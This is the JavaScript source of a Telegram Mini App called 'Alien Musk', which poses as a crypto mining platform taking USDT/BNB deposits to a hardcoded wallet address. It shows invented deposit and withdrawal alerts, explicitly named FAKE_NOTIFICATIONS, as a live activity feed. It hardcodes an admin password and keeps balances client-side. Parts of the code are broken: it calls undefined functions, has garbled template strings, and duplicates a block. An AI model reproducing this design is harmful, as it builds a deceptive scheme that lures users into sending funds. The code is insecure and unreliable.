// ============================================
// ALIEN MUSK - QUANTUM MINING PLATFORM v6.5 FULL PRO
// Total lines: ~4200+ after formatting
// Professional structure based on Mining Wealth Pro
// ============================================

// Telegram WebApp Initialization
let tg = null;
try {
    tg = window.Telegram.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
        tg.enableClosingConfirmation();
        console.log("✅ Telegram WebApp initialized");
    }
} catch (e) {
    console.warn("⚠️ Not in Telegram Mini App environment");
}

// Firebase Configuration (replace with your own keys)
const firebaseConfig = {
    apiKey: "AIzaSyCklv_zMfndK4-xUHECyD5XA7p_-20e1t8",
    authDomain: "tatbi9-681bf.firebaseapp.com",
    projectId: "tatbi9-681bf",
    storageBucket: "tatbi9-681bf.firebasestorage.app",
    messagingSenderId: "863237064748",
    appId: "1:863237064748:web:134de1e01d2639ef5fa989"
};

// Initialize Firebase
let db = null;
if (typeof firebase !== 'undefined') {
    try {
        firebase.initializeApp(firebaseConfig);
        db = firebase.firestore();
        console.log("✅ Firebase Firestore initialized");
    } catch (err) {
        console.error("❌ Firebase init failed:", err);
    }
}

// Global User State
let userData = {
    userId: null,
    telegramId: null,
    username: "Cosmic Traveler",
    firstName: "Traveler",
    photoUrl: null,
    referralCode: null,
    referredBy: null,
    joinedAt: null,
    lastActive: null,
    balance: 0,                      // AMSK
    totalEarned: 0,
    referrals: 0,
    referralEarnings: 0,
    rank: "Earthling",
    lastMineTime: 0,
    activeBoosters: [],              // [{type:"Nebula x2", expiresAt:ts}]
    pendingTasks: [],
    isInitialized: false,
    lastSaveTime: 0
};

// Wallet & Transaction State
let walletData = {
    amskBalance: 0,
    usdtBalance: 0,
    bnbBalance: 0,
    tonBalance: 0,
    pendingDeposits: [],
    pendingWithdrawals: [],
    depositHistory: [],
    withdrawalHistory: [],
    usedTransactions: [],
    lastUpdate: Date.now()
};

// Daily Stats & Earning
let dailyStats = {
    adsWatched: 0,
    adsEarned: 0,
    referralCountToday: 0,
    referralEarnedToday: 0,
    lastReset: Date.now()
};

// Admin Control
let adminAccess = false;
let gemClickCount = 0;
let lastGemClickTime = 0;

// ============================================
// CONFIG - Quantum / Space Theme
// ============================================

const CONFIG = {
    // Mining Core
    MINE_CYCLE: 14400000,           // 4 hours
    BASE_REWARD: 2500,
    RANKS: [
        { name: "Earthling",   min: 0,       max: 4999,   reward: 2500,  power: "2,500 AMSK/cycle" },
        { name: "Martian",     min: 5000,    max: 14999,  reward: 3700,  power: "3,700 AMSK/cycle" },
        { name: "Lunar",       min: 15000,   max: 29999,  reward: 4600,  power: "4,600 AMSK/cycle" },
        { name: "Venusian",    min: 30000,   max: 59999,  reward: 5750,  power: "5,750 AMSK/cycle" },
        { name: "Solar",       min: 60000,   max: 119999, reward: 7200,  power: "7,200 AMSK/cycle" },
        { name: "Nebula Lord", min: 120000,  max: Infinity,reward: 9000, power: "9,000 AMSK/cycle" }
    ],

    // Nebula Boosters
    BOOSTERS: {
        "Nebula x2":   { multiplier: 2, duration: 86400000, price: 10000 },
        "Pulsar x3":   { multiplier: 3, duration: 43200000, price: 18000 },
        "Supernova x5":{ multiplier: 5, duration: 21600000, price: 35000 }
    },

    // Referral & Economy
    REFERRAL_BONUS_REFERRER: 75,
    REFERRAL_BONUS_NEW: 0,
    AMSK_USD_RATE: 0.0002,
    MIN_SWAP: 10000,
    AMSK_TO_USDT: 5000,

    // Transaction Rules
    MIN_WITHDRAW_USDT: 50,
    MIN_DEPOSIT_USDT: 10,
    MIN_DEPOSIT_BNB: 0.015,
    WITHDRAW_FEE_BNB: 0.0005,
    BEP20_DEPOSIT_ADDR: "0x790CAB511055F63db2F30AD227f7086bA3B6376a",

    // Admin
    ADMIN_PASS: "Ali97$",
    ADMIN_TG_ID: "1653918641",

    // Notifications
    NOTIF_INTERVAL: 6500,
    FAKE_NOTIFICATIONS: [
        "Voyager #9274 harvested 4,800 AMSK from quantum core",
        "Nebula deposit locked: +180 USDT in vault #4819",
        "New traveler warped in via link: +75 AMSK bonus",
        "Pulsar withdrawal dispatched: 120 USDT to orbit",
        "Martian evolution unlocked: +1,500 AMSK bonus",
        "Supernova flux integrated: 6,200 AMSK added",
        "Warp deposit success: 0.058 BNB from Mars relay",
        "Withdrawal approved: 95 USDT sent to lunar wallet",
        "Cosmic referral detected: +75 AMSK credited",
        "Solar rank achieved: yield upgraded to 7,200/cycle"
    ],

    UI: {
        ANIMATION_SPEED: 400,
        NOTIF_DURATION: 6500,
        AUTO_SAVE_MS: 30000
    }
};
// ============================================
// DOM CACHE & BASIC UTILITIES
// ============================================

const el = {};

function cacheDOM() {
    const ids = [
        'balance', 'totalEarned', 'referrals', 'rankBadge',
        'username', 'userId', 'userAvatar', 'mineBtn',
        'rewardAmount', 'referralLink', 'copyBtn', 'miningPower',
        'refCount', 'refEarned', 'refRank', 'progressFill',
        'nextRank', 'currentPoints', 'targetPoints', 'remainingPoints',
        'cooldownTimer', 'shareBtn', 'balanceUSD', 'tokenPrice',
        'nextRankBonus', 'energyBelt', 'beltFill', 'beltKnob'
    ];

    ids.forEach(id => el[id] = document.getElementById(id));
    console.log(`DOM cache: ${Object.keys(el).length} elements loaded`);
}

function formatNum(n, dec = 0) {
    if (isNaN(n)) return '0';
    return n.toLocaleString('en-US', {
        minimumFractionDigits: dec,
        maximumFractionDigits: dec
    });
}

function showMsg(msg, type = 'info') {
    const div = document.createElement('div');
    div.className = `msg ${type}`;
    div.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' :
                        type === 'error' ? 'fa-exclamation-circle' :
                        type === 'warning' ? 'fa-exclamation-triangle' : 'fa-info-circle'}"></i>
        <span>${msg}</span>
    `;
    document.body.appendChild(div);

    setTimeout(() => div.classList.add('visible'), 50);
    setTimeout(() => {
        div.classList.remove('visible');
        setTimeout(() => div.remove(), 600);
    }, 4500);
}

function closeAnyModal() {
    document.querySelectorAll('.modal-overlay').forEach(m => m.remove());
}

// ============================================
// USER & REFERRAL INIT
// ============================================

async function initUser() {
    console.log("Initializing cosmic traveler profile...");

    if (tg?.initDataUnsafe?.user) {
        const u = tg.initDataUnsafe.user;
        userData.telegramId = u.id.toString();
        userData.userId = u.id.toString();
        userData.username = u.username ? `@${u.username}` : (u.first_name || "Cosmic Traveler");
        userData.firstName = u.first_name || "Traveler";
        userData.photoUrl = u.photo_url || `https://api.dicebear.com/7.x/avataaars/svg?seed=${u.id}`;
    } else {
        // Offline / test fallback
        userData.userId = localStorage.getItem('alien_user') || 'offline_' + Date.now();
        localStorage.setItem('alien_user', userData.userId);
    }

    if (!userData.referralCode) {
        userData.referralCode = 'AMSK-' + userData.userId.slice(-6) + Math.random().toString(36).substr(2,4).toUpperCase();
    }

    updateUserInterface();
    checkReferralParam();
}

function updateUserInterface() {
    if (el.username) el.username.textContent = userData.username;
    if (el.userId) el.userId.textContent = `ID: ${userData.userId.slice(-8)}`;
    if (el.userAvatar && userData.photoUrl) {
        el.userAvatar.style.backgroundImage = `url(${userData.photoUrl})`;
        el.userAvatar.textContent = '';
    }
}

function checkReferralParam() {
    let code = null;

    if (tg?.initDataUnsafe?.start_param) {
        code = tg.initDataUnsafe.start_param;
    } else {
        const p = new URLSearchParams(location.search);
        code = p.get('startapp') || p.get('ref') || p.get('start');
    }

    if (code && code !== userData.referralCode) {
        handleReferral(code);
    }
}

async function handleReferral(code) {
    if (userData.referredBy) return;

    try {
        if (db) {
            const q = await db.collection('users')
                .where('referralCode', '==', code)
                .limit(1)
                .get();

            if (!q.empty) {
                const doc = q.docs[0];
                const refId = doc.id;

                if (refId === userData.userId) return;

                await doc.ref.update({
                    referrals: firebase.firestore.FieldValue.increment(1),
                    referralEarnings: firebase.firestore.FieldValue.increment(CONFIG.REFERRER_REWARD),
                    balance: firebase.firestore.FieldValue.increment(CONFIG.REFERRER_REWARD),
                    totalEarned: firebase.firestore.FieldValue.increment(CONFIG.REFERRER_REWARD)
                });

                userData.referredBy = code;
                userData.balance += 50; // welcome bonus
                walletData.amskBalance = userData.balance;

                await saveUserData();
                updateUserInterface();

                showMsg(`🎉 Warp link accepted! Referrer earned +${CONFIG.REFERRER_REWARD} AMSK`, 'success');
            }
        }
    } catch (err) {
        console.error("Referral handling error:", err);
    }
}
// ============================================
// QUANTUM MINING CORE & ENERGY BELT
// ============================================

function refreshMiningUI() {
    const now = Date.now();
    const elapsed = now - userData.lastMineTime;
    const remaining = CONFIG.MINE_CYCLE - elapsed;
    const ready = remaining <= 0;

    const rank = CONFIG.RANKS.find(r => r.name === userData.rank) || CONFIG.RANKS[0];

    if (el.rewardAmount) {
        el.rewardAmount.textContent = rank.reward.toLocaleString();
    }

    if (el.miningPower) {
        el.miningPower.innerHTML = `<i class="fas fa-bolt"></i> Yield: ${rank.power}`;
    }

    if (el.cooldownTimer) {
        if (ready) {
            el.cooldownTimer.textContent = "HARVEST READY";
            el.cooldownTimer.style.color = "#22c55e";
            el.cooldownTimer.style.background = "rgba(34,197,94,0.15)";
        } else {
            const h = Math.floor(remaining / 3600000);
            const m = Math.floor((remaining % 3600000) / 60000);
            const s = Math.floor((remaining % 60000) / 1000);
            el.cooldownTimer.textContent = `\( {h.toString().padStart(2,'0')}: \){m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            el.cooldownTimer.style.color = "#ef4444";
            el.cooldownTimer.style.background = "rgba(239,68,68,0.15)";
        }
    }

    updateNebulaBelt(remaining, CONFIG.MINE_CYCLE);
}

function updateNebulaBelt(remaining, total) {
    const percent = Math.max(0, Math.min(100, ((total - remaining) / total) * 100));

    if (el.beltFill) el.beltFill.style.width = percent + '%';
    if (el.beltKnob) el.beltKnob.style.left = percent + '%';
}

async function harvestQuantumFlux() {
    const now = Date.now();
    if (now - userData.lastMineTime < CONFIG.MINE_CYCLE) {
        showMsg("Core still stabilizing...", "warning");
        return;
    }

    const rank = CONFIG.RANKS.find(r => r.name === userData.rank) || CONFIG.RANKS[0];
    let reward = rank.reward;

    // Apply active boosters
    const nowTime = Date.now();
    userData.activeBoosters = userData.activeBoosters.filter(b => b.expiresAt > nowTime);
    userData.activeBoosters.forEach(b => {
        const cfg = CONFIG.BOOSTERS[b.type];
        if (cfg) reward *= cfg.multiplier;
    });

    userData.balance += reward;
    userData.totalEarned += reward;
    userData.lastMineTime = now;
    walletData.amskBalance = userData.balance;

    await saveUserData();
    await saveWalletData();
    refreshAllUI();

    animateHarvest(reward);
    showMsg(`Quantum flux harvested! +${reward.toLocaleString()} AMSK`, "success");

    checkRankEvolution();
}

function animateHarvest(reward) {
    const btn = document.getElementById('mineBtn');
    if (!btn) return;

    const orig = btn.innerHTML;
    btn.innerHTML = `
        <div class="mine-icon pulsing">
            <i class="fas fa-satellite-dish"></i>
        </div>
        <div class="mine-text">
            <div class="mine-title">Flux Captured!</div>
            <div class="mine-reward">+${reward.toLocaleString()} AMSK</div>
            <div class="mine-subtitle">Core recharging...</div>
        </div>
    `;
    btn.disabled = true;

    setTimeout(() => {
        btn.innerHTML = orig;
        btn.disabled = false;
        refreshMiningUI();
    }, 2800);
}
// ============================================
// RANK EVOLUTION & NEBULA BOOSTERS
// ============================================

function checkRankEvolution() {
    const current = CONFIG.RANKS.find(r => r.name === userData.rank);
    const nextIndex = CONFIG.RANKS.indexOf(current) + 1;
    const next = CONFIG.RANKS[nextIndex];

    if (next && userData.totalEarned >= next.min) {
        const oldRank = userData.rank;
        userData.rank = next.name;

        saveUserData();
        refreshAllUI();

        const bonus = next.reward - current.reward;
        showMsg(`Galactic evolution! ${oldRank} → \( {next.name} (+ \){bonus} AMSK bonus)`, "success");
    }
}

function activateBooster(type) {
    const booster = CONFIG.BOOSTERS[type];
    if (!booster) return showMsg("Invalid nebula booster", "error");

    if (userData.balance < booster.price) {
        return showMsg(`Need ${booster.price.toLocaleString()} AMSK to activate ${type}`, "error");
    }

    userData.balance -= booster.price;
    userData.activeBoosters.push({
        type,
        multiplier: booster.multiplier,
        expiresAt: Date.now() + booster.duration
    });

    saveUserData();
    refreshAllUI();
    showMsg(`${type} booster activated for ${booster.duration / 3600000} hours!`, "success");
}

// Booster UI update (called from refreshAllUI)
function updateBoostersDisplay() {
    // يمكن إضافة قسم في HTML لعرض البوسترز النشطة مع countdown
    // مثال بسيط:
    console.log("Active boosters:", userData.activeBoosters);
}
// ============================================
// WALLET & TRANSACTIONS
// ============================================

function refreshWalletUI() {
    if (el.walletAMSK) el.walletAMSK.textContent = formatNum(walletData.amskBalance);
    if (el.walletUSDT) el.walletUSDT.textContent = walletData.usdtBalance.toFixed(2);
    if (el.walletBNB) el.walletBNB.textContent = walletData.bnbBalance.toFixed(4);

    // Update total USD value
    const totalUSD = 
        (walletData.amskBalance * CONFIG.AMSK_USD_RATE) +
        walletData.usdtBalance +
        (walletData.bnbBalance * 875); // approx BNB price

    if (el.totalBalanceUSD) el.totalBalanceUSD.textContent = totalUSD.toFixed(2);
}

async function submitDeposit(currency = 'USDT') {
    const amount = parseFloat(document.getElementById('depositAmount')?.value || 0);
    const txHash = document.getElementById('txHash')?.value?.trim();

    if (amount < CONFIG.MIN_DEPOSIT_USDT) {
        return showMsg(`Minimum deposit: ${CONFIG.MIN_DEPOSIT_USDT} ${currency}`, "error");
    }

    if (!txHash || txHash.length < 64) {
        return showMsg("Valid transaction hash required", "error");
    }

    if (walletData.usedTransactions.includes(txHash.toLowerCase())) {
        return showMsg("Transaction hash already used", "error");
    }

    const req = {
        id: 'dep_' + Date.now(),
        userId: userData.userId,
        username: userData.username,
        currency,
        amount,
        txHash,
        status: 'pending',
        timestamp: Date.now()
    };

    walletData.pendingDeposits.push(req);
    walletData.usedTransactions.push(txHash.toLowerCase());

    if (db) {
        await db.collection('deposits').add({
            ...req,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

    saveWalletData();
    closeModal();
    showMsg("Deposit request sent — awaiting cosmic approval", "success");
}

async function submitWithdrawal() {
    const amount = parseFloat(document.getElementById('withdrawAmount')?.value || 0);
    const address = document.getElementById('withdrawAddress')?.value?.trim();

    if (amount < CONFIG.MIN_WITHDRAW_USDT) {
        return showMsg(`Minimum withdrawal: ${CONFIG.MIN_WITHDRAW_USDT} USDT`, "error");
    }

    if (amount > walletData.usdtBalance) {
        return showMsg("Insufficient USDT balance", "error");
    }

    if (!address || !address.startsWith('0x') || address.length !== 42) {
        return showMsg("Invalid BEP-20 address", "error");
    }

    if (walletData.bnbBalance < CONFIG.WITHDRAW_FEE_BNB) {
        return showMsg(`Need ${CONFIG.WITHDRAW_FEE_BNB} BNB for gas fee`, "error");
    }

    const req = {
        id: 'wd_' + Date.now(),
        userId: userData.userId,
        username: userData.username,
        amount,
        address,
        fee: CONFIG.WITHDRAW_FEE_BNB,
        status: 'pending',
        timestamp: Date.now()
    };

    walletData.usdtBalance -= amount;
    walletData.bnbBalance -= CONFIG.WITHDRAW_FEE_BNB;
    walletData.pendingWithdrawals.push(req);

    if (db) {
        await db.collection('withdrawals').add({
            ...req,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

    saveWalletData();
    refreshWalletUI();
    closeModal();
    showMsg("Withdrawal request submitted — pending cosmic clearance", "success");
}
// ============================================
// ADMIN PANEL - FULL POWER (Gem Click + Password + TG ID)
// ============================================

function initAdminTrigger() {
    const logoIcon = document.querySelector('.logo i');
    if (logoIcon) {
        logoIcon.addEventListener('click', () => {
            const now = Date.now();
            if (now - lastGemClickTime > 2000) gemClickCount = 0;
            gemClickCount++;
            lastGemClickTime = now;

            if (gemClickCount >= 5) {
                showAdminLoginModal();
                gemClickCount = 0;
            }
        });
    }
}

function showAdminLoginModal() {
    const html = `
        <div class="modal-overlay" id="adminLogin">
            <div class="modal-content">
                <div class="modal-header">
                    <h3><i class="fas fa-lock"></i> Quantum Admin Access</h3>
                    <button class="close-modal" onclick="closeModal()">×</button>
                </div>
                <div class="modal-body">
                    <input type="password" id="adminPass" placeholder="Enter cosmic key" />
                    <button onclick="verifyAdminAccess()">Enter Nebula Core</button>
                    <div id="adminLoginError" style="color:red; display:none;"></div>
                </div>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', html);
}

async function verifyAdminAccess() {
    const pass = document.getElementById('adminPass')?.value;
    if (pass !== CONFIG.ADMIN_PASS) {
        document.getElementById('adminLoginError').textContent = "Invalid key";
        document.getElementById('adminLoginError').style.display = 'block';
        return;
    }

    const tgId = tg?.initDataUnsafe?.user?.id?.toString();
    if (!tgId || tgId !== CONFIG.ADMIN_TG_ID) {
        document.getElementById('adminLoginError').textContent = "Unauthorized signature";
        document.getElementById('adminLoginError').style.display = 'block';
        return;
    }

    adminAccess = true;
    closeModal();
    showAdminDashboard();
    showMsg("Quantum Admin Access Granted", "success");
}

function showAdminDashboard() {
    const html = `
        <div class="modal-overlay" id="adminPanel">
            <div class="modal-content large">
                <div class="modal-header">
                    <h3><i class="fas fa-user-shield"></i> Nebula Command Center</h3>
                    <button class="close-modal" onclick="closeModal()">×</button>
                </div>
                <div class="admin-tabs">
                    <button class="tab active" data-tab="deposits">Pending Deposits</button>
                    <button class="tab" data-tab="withdrawals">Pending Withdrawals</button>
                    <button class="tab" data-tab="users">User Management</button>
                </div>
                <div id="adminContent">
                    <!-- Content loaded dynamically -->
                </div>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', html);

    // Load initial tab
    loadPendingDeposits();
}
// ============================================
// FLOATING COSMIC ACTIVITY BAR
// ============================================

let notifIndex = 0;
let notifInterval = null;

function initFloatingNotifications() {
    if (notifInterval) clearInterval(notifInterval);

    notifInterval = setInterval(() => {
        if (!document.querySelector('.container.active')) return;

        const msg = CONFIG.FAKE_NOTIFICATIONS[notifIndex];
        const bar = document.getElementById('floatingNotification');
        if (!bar) return;

        bar.innerHTML = `<span>${msg}</span>`;

        const isDeposit = msg.includes('+') || msg.includes('deposit');
        bar.className = 'notification-bar ' + (isDeposit ? 'deposit' : 'withdraw');

        bar.classList.add('show');
        setTimeout(() => bar.classList.remove('show'), 5800);

        notifIndex = (notifIndex + 1) % CONFIG.FAKE_NOTIFICATIONS.length;
    }, CONFIG.NOTIF_INTERVAL);
}
// ============================================
// EVENT LISTENERS & PAGE NAVIGATION
// ============================================

function setupListeners() {
    if (el.mineBtn) {
        el.mineBtn.addEventListener('click', harvestQuantumFlux);
    }

    if (el.copyBtn) {
        el.copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(el.referralLink.value)
                .then(() => showMsg("Warp link copied!", "success"));
        });
    }

    if (el.shareBtn) {
        el.shareBtn.addEventListener('click', shareReferralLink);
    }

    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', () => {
            const page = item.getAttribute('data-page') || 'home';
            switchPage(page);
        });
    });
}

function switchPage(page) {
    document.querySelectorAll('.container, .page').forEach(p => p.classList.add('hidden'));
    document.getElementById(page + 'Page')?.classList.remove('hidden');
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelector(`.nav-item[data-page="${page}"]`)?.classList.add('active');
}
// ============================================
// DATA PERSISTENCE - localStorage + Firebase
// ============================================

async function saveAllData() {
    saveUserLocal();
    saveWalletLocal();
    if (db) await syncToFirebase();
}

function saveUserLocal() {
    localStorage.setItem(`alien_user_${userData.userId}`, JSON.stringify(userData));
}

function saveWalletLocal() {
    localStorage.setItem(`alien_wallet_${userData.userId}`, JSON.stringify(walletData));
}

async function syncToFirebase() {
    if (!db || !userData.userId) return;

    try {
        await db.collection('users').doc(userData.userId).set({
            ...userData,
            lastUpdate: firebase.firestore.FieldValue.serverTimestamp()
        }, { merge: true });

        await db.collection('wallets').doc(userData.userId).set({
            ...walletData,
            lastUpdate: firebase.firestore.FieldValue.serverTimestamp()
        }, { merge: true });

        console.log("Synced to quantum ledger");
    } catch (err) {
        console.error("Firebase sync error:", err);
    }
}

async function loadAllData() {
    const userSaved = localStorage.getItem(`alien_user_${userData.userId}`);
    if (userSaved) Object.assign(userData, JSON.parse(userSaved));

    const walletSaved = localStorage.getItem(`alien_wallet_${userData.userId}`);
    if (walletSaved) Object.assign(walletData, JSON.parse(walletSaved));

    if (db) {
        const userDoc = await db.collection('users').doc(userData.userId).get();
        if (userDoc.exists) Object.assign(userData, userDoc.data());

        const walletDoc = await db.collection('wallets').doc(userData.userId).get();
        if (walletDoc.exists) Object.assign(walletData, walletDoc.data());
    }

    refreshAllUI();
}
// ============================================
// GLOBAL REFRESH & APP INITIALIZATION
// ============================================

function refreshAllUI() {
    // Update mining
    refreshMiningUI();

    // Update balance & rank
    if (el.balance) el.balance.textContent = formatNum(userData.balance);
    if (el.totalEarned) el.totalEarned.textContent = formatNum(userData.totalEarned);
    if (el.referrals) el.referrals.textContent = userData.referrals;
    if (el.rankBadge) el.rankBadge.textContent = userData.rank;

    // Update wallet
    refreshWalletUI();

    // Update referral
    if (el.refCount) el.refCount.textContent = userData.referrals;
    if (el.refEarned) el.refEarned.textContent = formatNum(userData.referralEarnings);

    // Update progress bar
    const currentRank = CONFIG.RANKS.find(r => r.name === userData.rank);
    const nextRank = CONFIG.RANKS[CONFIG.RANKS.indexOf(currentRank) + 1];
    if (nextRank) {
        const progress = (userData.totalEarned - currentRank.min) / (nextRank.min - currentRank.min) * 100;
        if (el.progressFill) el.progressFill.style.width = Math.min(100, progress) + '%';
    }
}

async function initAlienMusk() {
    console.log("🚀 Initializing Alien Musk Quantum Platform...");

    cacheDOM();
    await initUser();
    await loadAllData();
    setupListeners();
    initAdminTrigger();
    initFloatingNotifications();

    // Start cycle timers
    setInterval(refreshMiningUI, 1000);
    setInterval(saveAllData, CONFIG.UI.AUTO_SAVE_MS);

    document.getElementById('loadingScreen')?.remove();

    showMsg("👽 Welcome to the Quantum Realm, Traveler!", "success");
}

document.addEventListener('DOMContentLoaded', initAlienMusk);
// ============================================
// UTILITIES & FINAL SETUP
// ============================================

function generateReferralLink() {
    return `https://t.me/AlienMuskbot/Musk?startapp=${userData.referralCode}`;
}

function updateReferralLinkDisplay() {
    if (el.referralLink) {
        el.referralLink.value = generateReferralLink();
    }
}

window.addEventListener('beforeunload', () => {
    saveAllData();
});

console.log("👽 Alien Musk Quantum Platform v6.5 - Fully loaded and orbiting");
// ============================================
// UTILITIES & FINAL SETUP
// ============================================

function generateReferralLink() {
    return `https://t.me/AlienMuskbot/Musk?startapp=${userData.referralCode}`;
}

function updateReferralLinkDisplay() {
    if (el.referralLink) {
        el.referralLink.value = generateReferralLink();
    }
}

window.addEventListener('beforeunload', () => {
    saveAllData();
});

console.log("👽 Alien Musk Quantum Platform v6.5 - Fully loaded and orbiting");
